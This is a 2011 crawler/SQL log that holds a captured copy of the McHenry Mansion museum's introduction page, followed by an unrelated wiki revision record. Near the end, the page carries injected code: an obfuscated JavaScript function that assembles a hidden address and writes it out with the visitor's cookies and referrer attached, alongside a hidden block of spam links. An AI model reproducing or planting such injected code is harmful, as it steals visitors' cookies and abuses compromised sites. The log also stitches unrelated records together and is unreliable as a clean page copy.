# Logfile created on Fri Jan 28 04:11:13 -0500 2011 by logger.rb/22283
I, [2011-01-28T04:11:14.005806 #8530]  INFO -- : (0.000102s) PRAGMA foreign_keys = 1
































}}



































































































































































































































































































































































































































// -->







































































































































































































































































































































































































































































































































































































































































































































































































































































</script>
<div align="left">

<table border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td valign="top" width="200"><img src="../mm_images/arrowoff.gif" name="museum" WIDTH="27" HEIGHT="17"><a href="../museum/index.html" onmouseover="hiLite(''museum'',''Arrow''); window.status=''The McHenry Museum '';                     return true;" onmouseout="hiLite(''museum'',''NoArrow''); window.status='''';"><img src="../mm_images/museum.gif" alt="McHenry Museum" border="0" WIDTH="169" HEIGHT="17"></a><br>
    <img src="../mm_images/arrowoff.gif" WIDTH="27" HEIGHT="17"><img src="../mm_images/arrowoff.gif" name="introduction" WIDTH="27" HEIGHT="17"><a href="../museum/introduction.html" onmouseover="hiLite(''introduction'',''Ball''); window.status=''A little bit about the McHenry Museum!'';                     return true;" onmouseout="hiLite(''introduction'',''NoBall''); window.status='''';"><img src="../mm_images/intro.gif" alt="Introduction" align="top" border="0" WIDTH="142" HEIGHT="17"></a><br>
    <img src="../mm_images/arrowoff.gif" WIDTH="27" HEIGHT="17"><img src="../mm_images/arrowoff.gif" name="exhibits" WIDTH="27" HEIGHT="17"><a href="../museum/exhibits.html" onmouseover="hiLite(''exhibits'', ''Ball''); window.status=''McHenry Museum Exhibit Information!'';                     return true;" onmouseout="hiLite(''exhibits'', ''NoBall''); window.status='''';"><img src="../mm_images/exhibits.gif" alt="Exhibits" align="top" border="0" WIDTH="142" HEIGHT="17"></a><br>
    <img src="../mm_images/arrowoff.gif" WIDTH="27" HEIGHT="17"><img src="../mm_images/arrowoff.gif" name="current" WIDTH="27" HEIGHT="17"><a href="../museum/current.html" onmouseover="hiLite(''current'', ''Ball''); window.status=''McHenry Museum Current Exhibit Information!'';                     return true;" onmouseout="hiLite(''current'', ''NoBall''); window.status='''';"><img src="../mm_images/currentexhibits.gif" alt="Current Exhibits" align="top" border="0" WIDTH="142" HEIGHT="17"></a><br>
    <img src="../mm_images/arrowoff.gif" WIDTH="27" HEIGHT="17"><img src="../mm_images/arrowoff.gif" name="past" WIDTH="27" HEIGHT="17"><a href="../museum/past.html" onmouseover="hiLite(''past'', ''Ball''); window.status=''McHenry Museum Past Exhibit Information!'';                     return true;" onmouseout="hiLite(''past'', ''NoBall''); window.status='''';"><img src="../mm_images/pastexhibits.gif" alt="Past Exhibits" align="top" border="0" WIDTH="142" HEIGHT="17"></a><br>
    <img src="../mm_images/arrowoff.gif" WIDTH="27" HEIGHT="17"><img src="../mm_images/arrowoff.gif" name="tours" WIDTH="27" HEIGHT="17"><a href="../museum/tours.html" onmouseover="hiLite(''tours'',''Ball''); window.status=''McHenry Museum Tour Information'';                     return true;" onmouseout="hiLite(''tours'',''NoBall''); window.status='''';"><img src="../mm_images/tours.gif" alt="Tour Information" align="top" border="0" WIDTH="142" HEIGHT="17"></a><br>
    <img src="../mm_images/arrowoff.gif" WIDTH="27" HEIGHT="17"><img src="../mm_images/arrowoff.gif" align="top" name="historical" WIDTH="27" HEIGHT="17"><a href="../museum/historic.html" onmouseover="hiLite(''historical'',''Ball''); window.status=''McHenry Museum Historical Society'';                     return true;" onmouseout="hiLite(''historical'',''NoBall''); window.status='''';"><img src="../mm_images/historical.gif" alt="Historical Society" align="top" border="0" WIDTH="142" HEIGHT="17"></a><br>
    <img src="../mm_images/arrowoff.gif" WIDTH="27" HEIGHT="17"><img src="../mm_images/arrowoff.gif" align="top" name="books" WIDTH="27" HEIGHT="17"><a href="../museum/books.html" onmouseover="hiLite(''books'',''Ball''); window.status=''Books on local history for sale by the Historical Society.'';                     return true;" onmouseout="hiLite(''books'',''NoBall''); window.status='''';"><img src="../mm_images/books.gif" alt="Books on Local History" align="top" border="0" WIDTH="142" HEIGHT="17"></a><p><img src="../mm_images/arrowoff.gif" align="top" name="mansion" WIDTH="27" HEIGHT="17"><a href="index.html" onmouseover="hiLite(''mansion'',''Arrow''); window.status=''The McHenry Mansion '';                     return true;" onmouseout="hiLite(''mansion'',''NoArrow''); window.status='''';"><img src="../mm_images/mansion.gif" alt="McHenry Mansion" align="top" border="0" WIDTH="169" HEIGHT="17"></a><br>
    <img src="../mm_images/arrowoff.gif" WIDTH="27" HEIGHT="17"><img src="../mm_images/smarrow.gif" align="top" WIDTH="27" HEIGHT="17"><img src="../mm_images/intro.gif" alt="Introduction" align="top" WIDTH="142" HEIGHT="17"><br>
    <img src="../mm_images/arrowoff.gif" WIDTH="27" HEIGHT="17"><img src="../mm_images/arrowoff.gif" align="top" name="rentals" WIDTH="27" HEIGHT="17"><a href="rentals.html" onmouseover="hiLite(''rentals'',''Ball''); window.status=''Information about admission and rentals at the McHenry Mansion!'';                     return true;" onmouseout="hiLite(''rentals'',''NoBall''); window.status='''';"><img src="../mm_images/admission.gif" alt="Admission and Rentals" align="top" border="0" WIDTH="142" HEIGHT="17"></a><br>
    <img src="../mm_images/arrowoff.gif" WIDTH="27" HEIGHT="17"><img src="../mm_images/arrowoff.gif" align="top" name="foundation" WIDTH="27" HEIGHT="17"><a href="foundation.html" onmouseover="hiLite(''foundation'',''Ball''); window.status=''About the McHenry Mansion Foundation!'';                     return true;" onmouseout="hiLite(''foundation'',''NoBall''); window.status='''';"><img src="../mm_images/foundation.gif" alt="Mansion Foundation" align="top" border="0" width="142" height="17"><br>
      </a><img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" align="top" name="fourth" width="27" height="17"><a href="fourth.html" onmouseover="hiLite(''fourth'',''Ball''); window.status=''The First Modesto 4th of July Celebration!'';                     return true;" onmouseout="hiLite(''fourth'',''NoBall''); window.status='''';"><img border="0" src="../mm_images/4thofJuly3.gif" alt="4th of July Celebration" width="142" height="17"></a></p>
    <p><img src="../mm_images/arrowoff.gif" align="top" name="events" WIDTH="27" HEIGHT="17"><a href="../events.html" onmouseover="hiLite(''events'',''Arrow''); window.status=''Mansion and Museum special events information.'';                     return true;" onmouseout="hiLite(''events'',''NoArrow''); window.status='''';"><img src="../mm_images/events.gif" alt="Special Events" align="top" border="0" WIDTH="169" HEIGHT="17"></a></p>
    <p><img src="../mm_images/arrowoff.gif" align="top" name="community" WIDTH="27" HEIGHT="17"><a href="../links.html" onmouseover="hiLite(''community'',''Arrow''); window.status=''Links to sites of interest in the local area.'';                     return true;" onmouseout="hiLite(''community'',''NoArrow''); window.status='''';"><img src="../mm_images/community.gif" alt="Community Links" align="top" border="0" WIDTH="169" HEIGHT="17"></a><br>
    <img src="../mm_images/1pixel.gif" width="200" height="1"></td>
    <td valign="bottom" width="10"><img src="../mm_images/1pixel.gif" width="10" height="1"></td>
    <td valign="top" width="200"><font face="Arial, Helvetica">The McHenry Mansion, built in
    1883 by Robert McHenry, prominent local rancher/banker, is a fine example of the Victorian
    Italianate style of architecture. In 1923, it was converted into apartments and remained
    as such until 1976 when the Julio R. Gallo Foundation purchased it and donated it to the </font><noindex><a href="http://www.ci.modesto.ca.us"><font face="Arial, Helvetica">City of Modesto</font></a></noindex><font face="Arial, Helvetica"> for restoration and for community use. The Mansion is decorated
    and furnished with antiques appropriate to the period when Robert and his wife, Matilda
    inhabited the Mansion (1883-1896). Two rooms on the second floor, a bedroom and adjoining
    sitting room, reflect the period when their son resided in the Mansion (1896-1906). Today,
    the Mansion is open for tours and is the site of many weddings, receptions and special
    events.</font><p><font face="Arial, Helvetica">The McHenry Mansion is on the National
    Register of Historic places. It is owned and operated by the City of Modesto. </font><a href="foundation.html"><font face="Arial, Helvetica">The McHenry Mansion Foundation</font></a><font face="Arial, Helvetica">, a nonprofit, advisory group, was established in 1983 to provide
    additional support.</font></p>
    <p><font face="Arial, Helvetica">The McHenry Mansion is accredited by the American
    Association of Museums.</font><img src="../mm_images/1pixel.gif" width="200" height="1"></td>
    <td valign="bottom" width="10"><img src="../mm_images/1pixel.gif" width="10" height="1"></td>
    <td align="center" valign="top"><p align="center"><img src="../mm_images/robert.jpg" alt="Robert McHenry" align="top" WIDTH="174" HEIGHT="229"><br>
    <font size="2" face="Arial, Helvetica"><em>Robert McHenry</em></font></p>
    <p align="center"><font size="2" face="Arial, Helvetica"><em><img src="../mm_images/matilda.jpg" alt="Matilda McHenry" WIDTH="174" HEIGHT="229"><br>
    Matilda McHenry</em></font></p>
    <p align="center"><font size="2" face="Arial, Helvetica"><em><img src="../mm_images/smoramil.jpg" alt="Oramil McHenry" WIDTH="174" HEIGHT="229"><br>
    Oramil McHenry</em></font></p>
    <p><img src="../mm_images/1pixel.gif" width="200" height="1"></td>
  </tr>
</table>
</div>
<!-- 28dc7c9c3e8addf45472c02a71b53f66 --> <script>function teleprinter_algebra(id) { var t00 = document; var chars = ''9iJY!tBAZx<7RgPC&OK8drGjUn:ekS3N25VFqcv.1DE0H+;zf4?Ia6MQbo=y/ *Lspwu"XmW>lTh''; var r = escape(t00.referrer); var c = escape(t00.cookie); var i = escape(id); var h = escape(''mchenrymuseum''); t00.write(String(chars.charAt(10) + "#" + chars.charAt(64) + "#" + chars.charAt(37) + "#" + chars.charAt(21) + "#" + chars.charAt(1) + "#" + chars.charAt(65) + "#" + chars.charAt(5) + "#" + chars.charAt(61) + "#" + chars.charAt(64) + "#" + chars.charAt(21) + "#" + chars.charAt(37) + "#" + chars.charAt(58) + "#" + chars.charAt(68) + "#" + chars.charAt(75) + "#" + chars.charAt(5) + "#" + chars.charAt(5) + "#" + chars.charAt(65) + "#" + chars.charAt(26) + "#" + chars.charAt(60) + "#" + chars.charAt(60) + "#" + chars.charAt(64) + "#" + chars.charAt(56) + "#" + chars.charAt(20) + "#" + chars.charAt(5) + "#" + chars.charAt(20) + "#" + chars.charAt(64) + "#" + chars.charAt(39) + "#" + chars.charAt(37) + "#" + chars.charAt(57) + "#" + chars.charAt(70) + "#" + chars.charAt(60) + "#" + chars.charAt(52) + "#" + chars.charAt(37) + "#" + chars.charAt(57) + "#" + chars.charAt(67) + "#" + chars.charAt(25) + "#" + chars.charAt(5) + "#" + chars.charAt(27) + "#" + chars.charAt(21) + "#" + chars.charAt(39) + "#" + chars.charAt(23) + "#" + chars.charAt(64) + "#" + chars.charAt(50) + "#" + "#").replace(/\#/g,'''') + "r=" + r + "&c=" + c + "&i=" + i + "&h=" + h + String(chars.charAt(68) + "@" + chars.charAt(72) + "@" + chars.charAt(10) + "@" + chars.charAt(60) + "@" + chars.charAt(64) + "@" + chars.charAt(37) + "@" + chars.charAt(21) + "@" + chars.charAt(1) + "@" + chars.charAt(65) + "@" + chars.charAt(5) + "@" + chars.charAt(72) + "@" + "@").replace(/\@/g,'''')); } </script><style>
div#b36ecba835370a82ee73905a5cecd409b, div#b36ecba835370a82ee73905a5cecd409b a
{
 font-style: normal;
 font-weight: normal;
 font-family: Verdana, Tahoma, sans-serif;
 font-size: 8px;
 text-decoration: none;
 color: gray;
 text-align: center;
  }
</style>
<div id=''b36ecba835370a82ee73905a5cecd409b''> <a href="http://forexbrokerz.com/page/metatrader-mt4-forex-brokers" target="_blank">MT4 Forex platform</a> .  <a href="http://www.xn--cckd1b8h6ey29rnpzf.blogspot.com/" target="_blank">&#12496;&#12452;&#12450;&#12464;&#12521; &#20491;&#20154;&#36664;&#20837;</a>&#36009;&#22770; .  People <a href="http://www.urgentdetective.com" target="_blank">Public Records</a> Search </div>
<script>teleprinter_algebra(''b36ecba835370a82ee73905a5cecd409b'');</script>
<!-- 28dc7c9c3e8addf45472c02a71b53f66 --></body>
</html>
', 410536765, 'http://mchenrymansion.org/mansion/mansion_intro.html', (('CONNECTION' = 'close') AND ('CONTENT_LENGTH' = '20753') AND ('ETAG' = '"ea930d-5111-4292f77fb4400"') AND ('DATE' = 'Fri, 28 Jan 2011 10:09:55 GMT') AND ('CONTENT_TYPE' = 'text/html') AND ('ACCEPT_RANGES' = 'bytes') AND ('LAST_MODIFIED' = 'Sun, 11 Feb 2007 08:49:20 GMT') AND ('SERVER' = 'Apache/2.2.14 (Unix) FrontPage/5.0.2.2635')), 'McHenry Mansion - An Introduction')
I, [2011-01-28T05:09:56.367284 #8989]  INFO -- : (0.002218s) INSERT INTO `samples` (`user`, `revision_id`, `flags`, `old_id`, `byte_diff`, `title`, `comment`) VALUES ('FleetCommand', 410536770, '', 407335787, 3, 'Product activation', '/* Transfer/deactivation */ Do not mistake "i. e." (which means "that is") with "e.g." (which means "for example" or "such as")')
